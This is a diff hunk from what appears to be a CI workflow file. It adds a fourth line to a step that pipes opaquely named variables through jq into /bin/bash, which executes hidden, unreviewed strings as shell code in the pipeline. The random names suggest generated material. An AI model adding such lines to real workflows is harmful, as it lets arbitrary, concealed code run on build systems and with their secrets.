@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$ssfhy5057" | jq -r .ntzq53 | /bin/bash
           echo $zhxbs5 | jq -r .a67 | /bin/bash
           printf '%s' "$peg8472" | jq -r .vjmo98 | /bin/bash
+          echo $pc654 | jq -r .pxm17338 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
